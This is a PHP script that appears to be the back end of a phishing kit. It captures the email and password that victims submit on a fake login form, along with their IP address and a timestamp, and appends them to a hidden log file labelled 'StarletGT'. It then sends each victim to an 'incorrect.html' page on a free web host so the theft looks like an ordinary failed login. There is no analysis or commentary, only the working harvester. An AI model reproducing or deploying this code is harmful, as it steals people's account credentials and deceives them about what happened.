<?php
$file = "2021________NewYear";
$email      = $_POST['email'];
$password   = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "==================== StarletGT ====================");
fwrite($handle, "\n");
fwrite($handle, "::  EMAIL     :: ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "::  PASSWORD  :: ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "::  IP        :: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "::  TIME      :: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fclose($handle);
header("Location:https://asameiko96.000webhostapp.com/marejsnj/incorrect.html?atch=99778d926097d1e1020dbc1b0173ca886c37411e94d6fbe47af9d67cf900fb210917e855");


?>